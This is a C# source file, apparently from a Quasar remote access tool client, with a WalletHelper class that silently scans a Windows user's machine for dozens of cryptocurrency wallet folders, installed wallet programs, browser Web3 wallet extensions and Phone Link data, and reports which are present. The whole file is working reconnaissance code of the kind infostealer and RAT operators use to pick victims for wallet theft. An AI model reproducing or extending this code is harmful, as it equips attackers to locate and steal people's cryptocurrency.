using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Helper
{
    public static class WalletHelper
    {
        public static bool HasYourPhoneData()
        {
            try
            {
                string username = Environment.UserName;
                string path = Path.Combine("C:\\Users", username, "AppData", "Local", "Packages", "Microsoft.YourPhone_8wekyb3d8bbwe", "LocalCache", "Local", "Microsoft");
                if (!Directory.Exists(path)) return false;

                long sizeBytes = 0;
                try
                {
                    foreach (var file in Directory.EnumerateFiles(path, "*", SearchOption.AllDirectories))
                    {
                        try { sizeBytes += new FileInfo(file).Length; } catch { }
                        if (sizeBytes > 0) return true;
                    }
                }
                catch { }

                return sizeBytes > 0;
            }
            catch { return false; }
        }
        public static string GetActiveWallets()
        {
            try
            {
                var foundWallets = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                CheckLocalWalletPaths(appdata, localappdata, foundWallets);
                CheckProgramFilesWallets(foundWallets);
                CheckBrowserWallets(appdata, localappdata, foundWallets);

                return string.Join(", ", foundWallets);
            }
            catch
            {
                return string.Empty;
            }
        }

        private static void CheckLocalWalletPaths(string appdata, string localappdata, HashSet<string> found)
        {
            // For robustness, check multiple common locations (Roaming and Local) and accept either a well-known file or the app directory.
            TryAdd(found, "Exodus",
                Path.Combine(appdata, "Exodus", "exodus.wallet"),
                Path.Combine(appdata, "Exodus"));

            TryAdd(found, "Atomic",
                Path.Combine(appdata, "atomic", "Local Storage", "leveldb"),
                Path.Combine(localappdata, "atomic", "Local Storage", "leveldb"),
                Path.Combine(appdata, "Atomic"),
                Path.Combine(localappdata, "Atomic"));

            TryAdd(found, "Guarda",
                Path.Combine(appdata, "Guarda", "Local Storage", "leveldb"),
                Path.Combine(localappdata, "Guarda", "Local Storage", "leveldb"),
                Path.Combine(appdata, "Guarda"),
                Path.Combine(localappdata, "Guarda"));

            TryAdd(found, "Electrum",
                Path.Combine(appdata, "Electrum", "wallets"),
                Path.Combine(appdata, "Electrum"));

            TryAdd(found, "ElectronCash",
                Path.Combine(appdata, "ElectronCash", "wallets"),
                Path.Combine(appdata, "ElectronCash"));

            TryAdd(found, "Jaxx",
                Path.Combine(appdata, "com.liberty.jaxx", "IndexedDB"),
                Path.Combine(appdata, "Jaxx"));

            TryAdd(found, "Zcash", Path.Combine(appdata, "Zcash"));
            TryAdd(found, "Armory", Path.Combine(appdata, "Armory"));
            TryAdd(found, "Bytecoin", Path.Combine(appdata, "bytecoin"));

            TryAdd(found, "Binance",
                Path.Combine(appdata, "Binance", "Local Storage", "leveldb"),
                Path.Combine(localappdata, "Binance", "Local Storage", "leveldb"),
                Path.Combine(appdata, "Binance"),
                Path.Combine(localappdata, "Binance"));

            TryAdd(found, "Coinomi",
                Path.Combine(appdata, "Coinomi", "Coinomi", "wallets"),
                Path.Combine(appdata, "Coinomi"));

            TryAdd(found, "Wasabi",
                Path.Combine(appdata, "WalletWasabi", "Client", "Wallets"),
                Path.Combine(appdata, "WalletWasabi"));

            TryAdd(found, "Monero", Path.Combine(appdata, "Monero"));
            TryAdd(found, "Ethereum", Path.Combine(appdata, "Ethereum", "keystore"));
            TryAdd(found, "Litecoin", Path.Combine(appdata, "Litecoin"));
            TryAdd(found, "Dash", Path.Combine(appdata, "DashCore"));
            TryAdd(found, "Bitcoin", Path.Combine(appdata, "Bitcoin"));
            TryAdd(found, "Dogecoin", Path.Combine(appdata, "Dogecoin"));
            TryAdd(found, "BitcoinGold", Path.Combine(appdata, "Bitcoin Gold"));
            TryAdd(found, "Ledger Live",
                Path.Combine(appdata, "Ledger Live"),
                Path.Combine(localappdata, "Ledger Live"));
            TryAdd(found, "Trezor Bridge",
                Path.Combine(appdata, "Trezor Bridge"),
                Path.Combine(localappdata, "Trezor Bridge"));

            TryAdd(found, "MyEtherWallet",
                Path.Combine(localappdata, "MyEtherWallet"),
                Path.Combine(appdata, "MyEtherWallet"));

            TryAdd(found, "Frame",
                Path.Combine(appdata, "Frame"),
                Path.Combine(localappdata, "Frame"));

            TryAdd(found, "TokenPocket",
                Path.Combine(appdata, "TokenPocket"),
                Path.Combine(localappdata, "TokenPocket"));

            TryAdd(found, "TrustWallet",
                Path.Combine(localappdata, "TrustWallet"),
                Path.Combine(appdata, "TrustWallet"));

            TryAdd(found, "Phantom",
                Path.Combine(localappdata, "Phantom"),
                Path.Combine(appdata, "Phantom"));

            TryAdd(found, "MultiBit", Path.Combine(appdata, "MultiBit"));
            TryAdd(found, "Electrum-LTC", Path.Combine(appdata, "Electrum-LTC", "wallets"));
            TryAdd(found, "Feathercoin", Path.Combine(appdata, "Feathercoin"));
            TryAdd(found, "Raven", Path.Combine(appdata, "Raven"));
            TryAdd(found, "Vertcoin", Path.Combine(appdata, "Vertcoin"));
        }

        private static void TryAdd(HashSet<string> found, string name, params string[] candidatePaths)
        {
            foreach (var path in candidatePaths)
            {
                try
                {
                    if (string.IsNullOrEmpty(path)) continue;
                    if (File.Exists(path) || Directory.Exists(path))
                    {
                        found.Add(name);
                        return;
                    }
                }
                catch { }
            }
        }

        private static void CheckProgramFilesWallets(HashSet<string> found)
        {
            try
            {
                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string programFilesX86 = Environment.GetEnvironmentVariable("ProgramFiles(x86)");

                if (!string.IsNullOrEmpty(programFiles))
                {
                    TryAdd(found, "Feather Wallet", Path.Combine(programFiles, "Feather Wallet"));
                    TryAdd(found, "Monero GUI", Path.Combine(programFiles, "Monero GUI Wallet"));
                }

                if (!string.IsNullOrEmpty(programFilesX86))
                {
                    TryAdd(found, "Feather Wallet", Path.Combine(programFilesX86, "Feather Wallet"));
                    TryAdd(found, "Monero GUI", Path.Combine(programFilesX86, "Monero GUI Wallet"));
                }
            }
            catch { }
        }

        private static void CheckBrowserWallets(string appdata, string localappdata, HashSet<string> found)
        {
            var browserUserDataDirs = new List<string>
            {
                Path.Combine(localappdata, "Google", "Chrome", "User Data"),
                Path.Combine(localappdata, "Google", "Chrome SxS", "User Data"),
                Path.Combine(localappdata, "Microsoft", "Edge", "User Data"),
                Path.Combine(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                Path.Combine(localappdata, "Vivaldi", "User Data"),
                Path.Combine(localappdata, "Yandex", "YandexBrowser", "User Data"),
                Path.Combine(localappdata, "CentBrowser", "User Data"),
                Path.Combine(localappdata, "7Star", "7Star", "User Data"),
                Path.Combine(localappdata, "Sputnik", "Sputnik", "User Data"),
                Path.Combine(localappdata, "Torch", "User Data"),
                Path.Combine(localappdata, "Kometa", "User Data"),
                Path.Combine(localappdata, "Orbitum", "User Data"),
                Path.Combine(localappdata, "Amigo", "User Data"),
                Path.Combine(localappdata, "Epic Privacy Browser", "User Data"),
                Path.Combine(localappdata, "uCozMedia", "Uran", "User Data"),
                Path.Combine(localappdata, "Iridium", "User Data"),
                // Opera stores profiles under %APPDATA%
                Path.Combine(appdata, "Opera Software", "Opera Stable"),
                Path.Combine(appdata, "Opera Software", "Opera GX Stable"),
            };

            var web3Extensions = new System.Collections.Generic.Dictionary<string, string>
            {
                {"nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"},
                {"ejbalbakoplchlghecdalmeeeajnimhm", "MetaMask (legacy)"},
                {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance Wallet"},
                {"hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase Wallet"},
                {"fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin Wallet"},
                {"egjidjbpglichdcondbcbdnbeeppgdph", "Trust Wallet"},
                {"bfnaelmomeimshlpmgjnjophhpkkoljpa", "Phantom"},
                {"aholpfdialjgjfhomihkjbmgjidlcdno", "Exodus Web3"},
                {"agoakfejjabomempkjlepdflaleeobhb", "Core"},
                {"mfgccjchihfkkindfppnaooecgfneiii", "TokenPocket"},
                {"lgmpcpglpngdoalbgeoldeajfclnhafa", "SafePal"},
                {"bhhhlbepdkbapadjdnnojkbgioiodbic", "Solflare"},
                {"ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"},
                {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda Web"},
                {"cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"},
                {"hhnhehfhjppfkfciahheljjfgdpbihep", "Keplr"},
            };

            foreach (var userDataDir in browserUserDataDirs)
            {
                try
                {
                    if (!Directory.Exists(userDataDir)) continue;

                    // Opera profiles may be single directories already; Chromium browsers have profiles under User Data
                    var candidateProfiles = new List<string>();
                    candidateProfiles.Add(userDataDir);
                    try
                    {
                        foreach (var dir in Directory.GetDirectories(userDataDir))
                        {
                            string name = Path.GetFileName(dir);
                            if (string.Equals(name, "Default", StringComparison.OrdinalIgnoreCase) ||
                                name.StartsWith("Profile", StringComparison.OrdinalIgnoreCase) ||
                                name.IndexOf("Opera", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                candidateProfiles.Add(dir);
                            }
                        }
                    }
                    catch { }

                    foreach (var profileDir in candidateProfiles)
                    {
                        string extensionsRoot = Path.Combine(profileDir, "Extensions");
                        if (!Directory.Exists(extensionsRoot)) continue;

                        foreach (var kv in web3Extensions)
                        {
                            try
                            {
                                string extPath = Path.Combine(extensionsRoot, kv.Key);
                                if (Directory.Exists(extPath))
                                    found.Add(kv.Value);
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }
        }
    }
}


